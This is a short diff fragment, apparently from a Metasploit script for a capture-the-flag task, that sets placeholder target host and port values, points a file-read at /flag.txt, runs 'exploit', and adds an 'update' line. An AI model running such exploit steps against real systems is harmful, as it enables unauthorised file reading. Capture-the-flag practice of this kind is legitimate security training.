@@ -377,3 +377,4 @@ set RHOSTS STMIP
 set RPORT STMPO
 set FILEPATH /flag.txt
 exploit
+update
